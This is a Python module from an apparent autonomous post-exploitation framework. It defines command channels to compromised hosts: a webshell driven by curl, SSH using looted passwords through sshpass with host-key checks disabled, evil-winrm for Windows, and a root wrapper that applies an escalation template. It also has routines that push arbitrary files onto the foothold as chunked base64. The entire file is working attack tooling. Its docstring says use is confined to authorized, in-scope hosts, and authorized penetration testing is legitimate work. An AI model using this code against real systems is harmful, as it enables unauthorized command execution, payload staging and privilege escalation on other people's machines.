"""Foothold session - a command-execution channel to an already-compromised host.

The recon/enum tools run as argv (no shell) against *untrusted* targets. A session
is different: it runs shell commands on a host you have ALREADY compromised and are
authorized to be on (a webshell, or SSH with looted creds). That is the channel the
autonomous post-exploitation phase drives to enumerate and escalate privileges.

Two kinds:
- **WebshellSession** - a URL template with a ``FUZZ`` marker where the (URL-encoded)
  command goes, e.g. ``http://host/shell.php?cmd=FUZZ``. Runs via curl.
- **SshSession** - user + password (via sshpass) or key, runs the command over ssh.

Both take an injectable ``runner(argv) -> (returncode, stdout, stderr)`` for tests.
A session is created only for a host already in scope (the CLI enforces that), and
every command it runs is written to the audit log.
"""

from __future__ import annotations

import json
import subprocess
from abc import ABC, abstractmethod
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import quote, urlparse

FUZZ = "FUZZ"


def _default_runner(argv: list[str], timeout: float) -> tuple[int, str, str]:  # pragma: no cover
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except OSError as exc:
        return -1, "", str(exc)


@dataclass
class Session(ABC):
    host: str

    @abstractmethod
    def _argv(self, command: str) -> list[str]:
        """Build the argv that executes `command` on the foothold."""

    def run(self, command: str, *, timeout: float = 30.0, runner=None) -> str:
        runner = runner or _default_runner
        _code, out, err = runner(self._argv(command), timeout)
        return out if out else err

    def upload(self, local_path: str, remote_path: str, *, timeout: float = 120.0,
               runner=None) -> bool:
        """Stage a local file onto the foothold at ``remote_path``.

        The default implementation base64-encodes the file and writes it via the
        command channel (works over any shell, including a webshell). Channels with
        a native transfer (scp/evil-winrm) override this. Returns True on a verified
        upload (the remote file exists and is non-empty).
        """
        import base64
        import os
        try:
            with open(local_path, "rb") as fh:
                blob = base64.b64encode(fh.read()).decode("ascii")
        except OSError:
            return False
        # Chunk the base64 to keep each command within URL/arg length limits.
        self.run(f"rm -f {remote_path}", timeout=timeout, runner=runner)
        for i in range(0, len(blob), 2048):
            chunk = blob[i:i + 2048]
            self.run(f"printf %s {chunk} >> {remote_path}.b64",
                     timeout=timeout, runner=runner)
        self.run(f"base64 -d {remote_path}.b64 > {remote_path}; "
                 f"rm -f {remote_path}.b64", timeout=timeout, runner=runner)
        out = self.run(f"test -s {remote_path} && echo OK", timeout=timeout, runner=runner)
        _ = os  # keep import meaningful for the OSError guard above
        return "OK" in (out or "")

    @abstractmethod
    def to_dict(self) -> dict: ...

    # --- persistence --------------------------------------------------------
    @staticmethod
    def load(path: Path) -> Session | None:
        try:
            d = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            return None
        return Session.from_dict(d)

    def save(self, path: Path) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(self.to_dict(), indent=2), encoding="utf-8")

    @staticmethod
    def from_dict(d: dict) -> Session | None:
        kind = d.get("kind")
        if kind == "webshell":
            return WebshellSession(host=d["host"], template=d["template"])
        if kind == "ssh":
            return SshSession(host=d["host"], user=d["user"],
                              password=d.get("password", ""), key=d.get("key", ""),
                              port=d.get("port", 22))
        if kind == "winrm":
            return WinrmSession(host=d["host"], user=d["user"],
                                password=d.get("password", ""),
                                port=d.get("port", 5985),
                                scheme=d.get("scheme", "http"))
        if kind == "root":
            base = Session.from_dict(d["base"])
            if base is not None:
                return RootSession(host=d["host"], base=base, template=d["template"])
        return None


@dataclass
class WebshellSession(Session):
    template: str = ""      # contains FUZZ where the URL-encoded command goes

    def _argv(self, command: str) -> list[str]:
        url = self.template.replace(FUZZ, quote(command, safe=""))
        return ["curl", "-s", "--max-time", "30", url]

    def to_dict(self) -> dict:
        return {"kind": "webshell", "host": self.host, "template": self.template}

    @classmethod
    def from_spec(cls, spec: str) -> WebshellSession:
        """`http://host/shell.php?cmd=FUZZ` -> a session (host parsed from the URL)."""
        if FUZZ not in spec:
            raise ValueError("webshell URL must contain a FUZZ marker for the command")
        host = urlparse(spec).hostname or ""
        return cls(host=host, template=spec)


@dataclass
class SshSession(Session):
    user: str = ""
    password: str = ""
    key: str = ""           # path to a private key (used instead of password)
    port: int = 22

    def _argv(self, command: str) -> list[str]:
        opts = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=8", "-p", str(self.port)]
        if self.key:
            return ["ssh", *opts, "-i", self.key, f"{self.user}@{self.host}", command]
        # sshpass feeds the password so the run is non-interactive.
        return ["sshpass", "-p", self.password, "ssh", *opts,
                f"{self.user}@{self.host}", command]

    def upload(self, local_path: str, remote_path: str, *, timeout: float = 120.0,
               runner=None) -> bool:
        """Native scp transfer (falls back to the base64 channel on failure)."""
        runner = runner or _default_runner
        opts = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-P", str(self.port)]
        dest = f"{self.user}@{self.host}:{remote_path}"
        if self.key:
            argv = ["scp", *opts, "-i", self.key, local_path, dest]
        else:
            argv = ["sshpass", "-p", self.password, "scp", *opts, local_path, dest]
        code, _out, _err = runner(argv, timeout)
        if code == 0:
            return True
        return super().upload(local_path, remote_path, timeout=timeout, runner=runner)

    def to_dict(self) -> dict:
        return {"kind": "ssh", "host": self.host, "user": self.user,
                "password": self.password, "key": self.key, "port": self.port}

    @classmethod
    def from_spec(cls, spec: str) -> SshSession:
        """`user:pass@host[:port]` -> a session."""
        creds, _, hostpart = spec.partition("@")
        if not hostpart:
            raise ValueError("ssh spec must be user:pass@host[:port]")
        user, _, password = creds.partition(":")
        host, _, port = hostpart.partition(":")
        return cls(host=host, user=user, password=password, port=int(port) if port else 22)


@dataclass
class WinrmSession(Session):
    """Windows Remote Management channel (evil-winrm), for Windows post-exploitation.

    ``evil-winrm`` accepts a `-c` (one-shot command) argv; the command is passed as a
    single positional string (no shell on the attacker side; the target expands it in
    PowerShell). The Windows autonomous privesc parser owns the output shape.
    """
    user: str = ""
    password: str = ""
    port: int = 5985
    scheme: str = "http"

    def _argv(self, command: str) -> list[str]:
        return ["evil-winrm", "-i", self.host, "-u", self.user,
                "-p", self.password, "-P", str(self.port), "-c", command]

    def upload(self, local_path: str, remote_path: str, *, timeout: float = 180.0,
               runner=None) -> bool:
        """Upload by writing a base64 blob out with PowerShell (works over `-c`)."""
        import base64
        try:
            with open(local_path, "rb") as fh:
                blob = base64.b64encode(fh.read()).decode("ascii")
        except OSError:
            return False
        rp = remote_path.replace("'", "''")
        self.run(f"Remove-Item -Force '{rp}.b64' -ErrorAction SilentlyContinue",
                 timeout=timeout, runner=runner)
        for i in range(0, len(blob), 3000):
            chunk = blob[i:i + 3000]
            self.run(f"Add-Content -Path '{rp}.b64' -Value '{chunk}' -NoNewline",
                     timeout=timeout, runner=runner)
        self.run(f"[IO.File]::WriteAllBytes('{rp}', "
                 f"[Convert]::FromBase64String((Get-Content '{rp}.b64' -Raw))); "
                 f"Remove-Item -Force '{rp}.b64'", timeout=timeout, runner=runner)
        out = self.run(f"if (Test-Path '{rp}') {{ 'OK' }}", timeout=timeout, runner=runner)
        return "OK" in (out or "")

    def to_dict(self) -> dict:
        return {"kind": "winrm", "host": self.host, "user": self.user,
                "password": self.password, "port": self.port, "scheme": self.scheme}

    @classmethod
    def from_spec(cls, spec: str) -> WinrmSession:
        """`user:pass@host[:port]` -> a WinRM session (defaults port 5985)."""
        creds, _, hostpart = spec.partition("@")
        if not hostpart:
            raise ValueError("winrm spec must be user:pass@host[:port]")
        user, _, password = creds.partition(":")
        host, _, port = hostpart.partition(":")
        return cls(host=host, user=user, password=password,
                   port=int(port) if port else 5985)


@dataclass
class RootSession(Session):
    """A root command channel layered on a foothold session: after autonomous
    escalation, commands run as root via the matched vector's template ({CMD})."""
    base: Session | None = None
    template: str = "{CMD}"

    def _argv(self, command: str) -> list[str]:
        return self.base._argv(self.template.replace("{CMD}", command))

    def run(self, command: str, *, timeout: float = 30.0, runner=None) -> str:
        return self.base.run(self.template.replace("{CMD}", command),
                             timeout=timeout, runner=runner)

    def to_dict(self) -> dict:
        return {"kind": "root", "host": self.host,
                "base": self.base.to_dict(), "template": self.template}
